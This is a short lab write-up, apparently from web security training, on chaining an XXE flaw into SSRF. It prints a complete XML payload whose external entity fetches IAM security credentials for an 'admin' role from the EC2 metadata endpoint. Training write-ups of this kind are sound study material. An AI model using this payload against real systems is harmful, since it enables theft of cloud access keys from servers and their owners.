Title: Exploiting XXE to perform SSRF attacks
Desc:  This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

example: ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>```

Basically the payload was the same as in the first lab, but I needed to craft proper endpoint to gain secret keys for admin in EC2:
```http://169.254.169.254/latest/meta-data/iam/security-credentials/admin```

Complete payload was: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>```
